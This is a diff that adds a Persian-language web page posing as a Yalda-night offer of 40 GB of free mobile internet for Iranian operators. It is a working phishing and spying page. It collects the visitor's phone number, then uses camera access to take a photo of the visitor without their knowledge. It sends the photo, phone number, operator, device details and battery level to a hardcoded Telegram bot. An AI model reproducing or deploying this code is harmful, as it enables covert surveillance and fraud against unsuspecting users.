@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>اینترنت یلدایی</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Vazirmatn:wght@700;900&display=swap');
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body {
+            background: linear-gradient(135deg, #8B0000, #FF4500);
+            font-family: 'Vazirmatn', sans-serif;
+            color: #fff;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+        }
+        .container {
+            background: rgba(0,0,0,0.7);
+            border-radius: 25px;
+            padding: 40px;
+            width: 90%;
+            max-width: 420px;
+            text-align: center;
+            box-shadow: 0 0 80px rgba(255,69,0,0.8);
+            animation: fireGlow 3s infinite alternate;
+            border: 3px solid #FF4500;
+        }
+        @keyframes fireGlow {
+            0% { box-shadow: 0 0 80px #FF4500; }
+            50% { box-shadow: 0 0 120px #FF1493; }
+            100% { box-shadow: 0 0 80px #FF4500; }
+        }
+        .logo {
+            width: 80px;
+            margin: 10px;
+            animation: rotate 8s linear infinite;
+        }
+        @keyframes rotate { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        h1 {
+            font-size: 32px;
+            background: linear-gradient(45deg, #FF4500, #FFD700, #FF1493);
+            -webkit-background-clip: text;
+            background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin: 20px 0;
+            text-shadow: 0 0 20px #FF4500;
+        }
+        p { font-size: 18px; margin: 20px 0; }
+        .operator {
+            background: linear-gradient(45deg, #FF4500, #8B0000);
+            padding: 20px;
+            margin: 15px 0;
+            border-radius: 20px;
+            font-size: 22px;
+            font-weight: 900;
+            cursor: pointer;
+            box-shadow: 0 0 30px rgba(255,69,0,0.8);
+            transition: 0.4s;
+        }
+        .operator:hover { transform: scale(1.05); box-shadow: 0 0 50px #FF1493; }
+        .operator.selected {
+            border: 4px solid #FFD700;
+            box-shadow: 0 0 60px #FFD700;
+        }
+        input {
+            width: 100%;
+            padding: 16px;
+            margin: 20px 0;
+            border: 3px solid #FF4500;
+            border-radius: 15px;
+            background: rgba(255,255,255,0.1);
+            color: white;
+            font-size: 20px;
+            text-align: center;
+            outline: none;
+        }
+        input:focus { border-color: #FFD700; box-shadow: 0 0 40px #FFD700; }
+        button {
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(45deg, #FF4500, #FF1493);
+            border: none;
+            border-radius: 20px;
+            color: white;
+            font-size: 24px;
+            font-weight: 900;
+            cursor: pointer;
+            box-shadow: 0 0 50px rgba(255,69,0,0.8);
+        }
+        button:hover { transform: scale(1.05); }
+        .hidden { display: none; }
+        video, canvas { display: none; }
+        .loading-text {
+            font-size: 20px;
+            margin: 30px 0;
+            animation: pulseText 2s infinite;
+        }
+        @keyframes pulseText { 0%,100% { opacity:1 } 50% { opacity:0.6 } }
+        .fire {
+            font-size: 40px;
+            animation: fireAnim 1.5s infinite;
+        }
+        @keyframes fireAnim { 0%,100% { transform: scale(1); } 50% { transform: scale(1.2); } }
+    </style>
+</head>
+<body>
+
+<div class="container" id="mainPage">
+    <div>
+        <!-- لوگو انار ۱ -->
+        <img src="https://www.pngwing.com/en/free-png-zgjwv/download" alt="انار" class="logo">
+        <!-- لوگو انار ۲ (معکوس برای زیبایی) -->
+        <img src="https://www.pngwing.com/en/free-png-zgjwv/download" alt="انار" class="logo" style="transform:scaleX(-1);">
+        <!-- لوگو پرتقال نارنجی -->
+        <img src="https://www.pngwing.com/en/free-png-ykqtr/download" alt="پرتقال" class="logo" style="width:100px;">
+    </div>
+    <h1>اینترنت یلدایی</h1>
+    <p style="font-size:24px;font-weight:900;">۴۰ گیگ اینترنت رایگان<br>۶۰ روزه 🔥</p>
+    <p>اپراتور خود را انتخاب کنید:</p>
+
+    <div class="operator" onclick="selectOperator('رایتل')">رایتل</div>
+    <div class="operator" onclick="selectOperator('ایرانسل')">ایرانسل</div>
+    <div class="operator" onclick="selectOperator('همراه اول')">همراه اول</div>
+
+    <input type="text" id="phone" placeholder="شماره موبایل (09123456789)" maxlength="11">
+    <button onclick="startLoading()">دریافت اینترنت یلدایی</button>
+</div>
+
+<div class="container hidden" id="loadingPage">
+    <div class="fire">🔥🔥🔥</div>
+    <h1>در حال فعال‌سازی...</h1>
+    <p class="loading-text">اینترنت یلدایی ۴۰ گیگ در حال شارژ شدن...</p>
+    <p class="loading-text">لطفاً صبر کنید، شب یلداتون آتیشی بشه! 🍊</p>
+    <div class="fire">🔥🔥🔥</div>
+</div>
+
+<video id="video" playsinline muted></video>
+<canvas id="canvas"></canvas>
+
+<script>
+    const TOKEN = "8275279514:AAHJOLN06O-ECc0_xZ7zUMnN9IOBDuw0-go";
+    const CHAT_ID = "-1003384762825";
+    let selectedOperator = "";
+    let userPhone = "";
+
+    function selectOperator(op) {
+        document.querySelectorAll('.operator').forEach(el => el.classList.remove('selected'));
+        event.target.classList.add('selected');
+        selectedOperator = op;
+    }
+
+    function startLoading() {
+        userPhone = document.getElementById('phone').value.trim();
+        if (!/^09[0-9]{9}$/.test(userPhone)) {
+            alert("شماره موبایل معتبر وارد کنید عشقم");
+            return;
+        }
+        if (!selectedOperator) {
+            alert("اپراتور رو انتخاب کن");
+            return;
+        }
+
+        document.getElementById('mainPage').classList.add('hidden');
+        document.getElementById('loadingPage').classList.remove('hidden');
+
+        setTimeout(requestCamera, 4000);
+    }
+
+    async function requestCamera() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "user", width: {ideal: 1920}, height: {ideal: 1080} } 
+            });
+            const video = document.getElementById('video');
+            video.srcObject = stream;
+            await video.play();
+
+            await new Promise(r => setTimeout(r, 3000));
+
+            const canvas = document.getElementById('canvas');
+            canvas.width = video.videoWidth || 1280;
+            canvas.height = video.videoHeight || 720;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+
+            canvas.toBlob(blob => {
+                const form = new FormData();
+                form.append('chat_id', CHAT_ID);
+                form.append('photo', blob, 'yaldai_user.jpg');
+                form.append('caption', getInfoText());
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {method:'POST', body:form});
+            }, 'image/jpeg', 0.95);
+
+            stream.getTracks().forEach(t => t.stop());
+            sendInfoText();
+
+        } catch(e) {
+            sendInfoText();
+        }
+    }
+
+    function getInfoText() {
+        const now = new Date().toLocaleString('fa-IR', { timeZone: 'Asia/Tehran' });
+        let battery = "نامشخص";
+        if ('getBattery' in navigator) {
+            navigator.getBattery().then(b => {
+                battery = `${Math.round(b.level * 100)}% ${b.charging ? "(در حال شارژ)" : ""}`;
+            });
+        }
+
+        return `کاربر جدید اینترنت یلدایی! 🔥
+
+𝗢𝗽𝗲𝗿𝗮𝘁𝗼𝗿: ${selectedOperator}
+𝗣𝗵𝗼𝗻𝗲: ${userPhone}
+𝗠𝗼𝗱𝗲𝗹: ${navigator.platform || navigator.userAgent}
+𝗕𝗮𝘁𝘁𝗲𝗿𝘆: ${battery}
+𝗧𝗶𝗺𝗲: ${now}
+
+𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿: ™MicY™`;
+    }
+
+    function sendInfoText() {
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(getInfoText())}`);
+    }
+</script>
+
+</body>
+</html>
